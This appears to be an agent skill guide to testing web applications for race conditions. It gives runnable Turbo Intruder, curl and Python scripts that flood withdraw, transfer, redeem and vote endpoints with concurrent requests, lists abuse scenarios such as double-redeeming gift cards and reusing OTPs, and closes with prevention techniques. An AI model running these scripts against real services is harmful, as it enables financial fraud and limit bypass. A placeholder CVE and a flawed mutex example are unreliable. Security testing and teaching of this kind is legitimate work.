---
name: race-condition
description: Race condition exploitation with HTTP/2 single-packet attacks. Use for concurrency testing.
---

# Race Condition

## Description
Race conditions occur when multiple processes or threads access shared resources concurrently, and the outcome depends on the timing of execution. In web applications, this can lead to limit bypasses, data corruption, authentication issues, and financial fraud.

## Vulnerability Types

### 1. Limit Overrun
Bypass limits by making concurrent requests before the limit is applied:
- Withdraw more money than available
- Redeem gift card multiple times
- Vote multiple times
- Bypass rate limits

### 2. Time-of-Check to Time-of-Use (TOCTOU)
Exploit the gap between checking a condition and acting on it.

### 3. Authentication Bypass
Exploit race conditions in session handling or token validation.

## Exploitation Techniques

### HTTP/1.1 Last-Byte Synchronization

Send requests without the final byte, then release them simultaneously:

```python
# Using Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)

    request = '''POST /transfer HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

amount=1000&to=attacker'''

    # Queue requests without sending last byte
    for i in range(30):
        engine.queue(request, gate='race')

    # Release all requests simultaneously
    engine.openGate('race')
```

### HTTP/2 Single-Packet Attack

Send ~20-30 requests over a single HTTP/2 connection in one TCP packet:

```python
# Eliminates network jitter for precise timing
# Use Burp Suite with HTTP/2 support

# In Turbo Intruder:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.HTTP2)

    for i in range(20):
        engine.queue(request, gate='race')

    engine.openGate('race')
```

### Parallel Request Sending

```bash
# Using GNU Parallel
seq 1 100 | parallel -j 100 curl -s -X POST https://target.com/redeem -d "code=GIFTCODE"

# Using curl with background processes
for i in {1..50}; do
    curl -s -X POST https://target.com/api/vote &
done
wait
```

### Python Threading
```python
import threading
import requests

def exploit():
    response = requests.post('https://target.com/api/withdraw',
                            data={'amount': 1000},
                            cookies={'session': 'token'})
    print(response.status_code, response.text)

# Launch concurrent requests
threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Start all threads nearly simultaneously
for t in threads:
    t.start()

for t in threads:
    t.join()
```

## Tools

### Turbo Intruder (Burp Suite)
```python
# race-single-packet-attack.py template
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.HTTP2)

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Raceocat
```bash
# https://github.com/nickmakesstuff/nickmakesstuff.github.io
# Automated race condition testing

raceocat -u "https://target.com/api/vote" -m POST -c 50
```

### Custom Python Script
```python
import asyncio
import aiohttp

async def send_request(session, url, data):
    async with session.post(url, data=data) as response:
        return await response.text()

async def race_attack(url, data, count=50):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data) for _ in range(count)]
        results = await asyncio.gather(*tasks)
        return results

# Execute
asyncio.run(race_attack('https://target.com/api/redeem',
                        {'code': 'GIFTCARD123'}))
```

## Common Vulnerable Scenarios

### 1. Gift Card/Coupon Redemption
```
Scenario: Redeem $100 gift card multiple times
Attack: Send 50 concurrent redemption requests
Result: Multiple $100 credits if race condition exists
```

### 2. Voting/Rating Systems
```
Scenario: One vote per user
Attack: Send multiple concurrent vote requests
Result: Multiple votes registered
```

### 3. Financial Transactions
```
Scenario: Account balance $100, transfer limit
Attack: Send concurrent $100 transfers
Result: Overdraw account
```

### 4. Invitation/Referral Limits
```
Scenario: Maximum 5 invitations per user
Attack: Send 20 concurrent invitation requests
Result: Send more than 5 invitations
```

### 5. Password Reset
```
Scenario: Reset token invalidated after use
Attack: Use token in concurrent requests
Result: Multiple password changes or session hijacking
```

### 6. Two-Factor Authentication
```
Scenario: OTP valid for one use
Attack: Send concurrent requests with same OTP
Result: Multiple successful authentications
```

## Testing Methodology

### 1. Identify Targets
```
- Actions with limits (rate limits, quantity limits)
- Financial operations
- Token-based operations
- Database operations without proper locking
```

### 2. Baseline Test
```
- Understand normal request flow
- Identify what should be rate-limited or unique
```

### 3. Concurrent Request Test
```
- Start with 10-20 concurrent requests
- Increase to 50-100 if needed
- Use HTTP/2 single-packet attack for precision
```

### 4. Analyze Results
```
- Count successful operations
- Check for duplicates
- Verify limit bypass
```

## Real-World Examples

### Instagram Password Reset (CVE-2021-XXXXX)
```
- Password reset OTP vulnerable to race condition
- Concurrent requests could bypass rate limiting
- Allowed brute-force of 6-digit OTP
```

### GitLab Merge Request (CVE-2022-4037)
```
- Race condition in merge request approval
- Could approve own merge request
```

## Detection Checklist

- [ ] Test concurrent requests on financial endpoints
- [ ] Test limit-based operations
- [ ] Test token redemption endpoints
- [ ] Test voting/rating systems
- [ ] Test coupon/discount code redemption
- [ ] Test file upload race conditions
- [ ] Test session handling race conditions

## Prevention

### Database-Level Locking
```sql
-- Use SELECT FOR UPDATE
BEGIN;
SELECT * FROM accounts WHERE id = 1 FOR UPDATE;
-- Perform operation
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
COMMIT;
```

### Application-Level Mutex
```python
import threading

lock = threading.Lock()

def safe_withdraw(amount):
    with lock:
        if balance >= amount:
            time.sleep(0.1)  # Simulate processing
            balance -= amount
            return True
    return False
```

### Atomic Operations
```python
# Redis example
redis.decr('user:123:votes_remaining')
# Atomic decrement
```

### Idempotency Keys
```python
# Use unique request identifier
def process_payment(idempotency_key, amount):
    if redis.setnx(f'payment:{idempotency_key}', 'processing'):
        # Process payment
        redis.set(f'payment:{idempotency_key}', 'completed')
    else:
        # Already processed
        pass
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition
- https://portswigger.net/web-security/race-conditions
- https://portswigger.net/research/smashing-the-state-machine
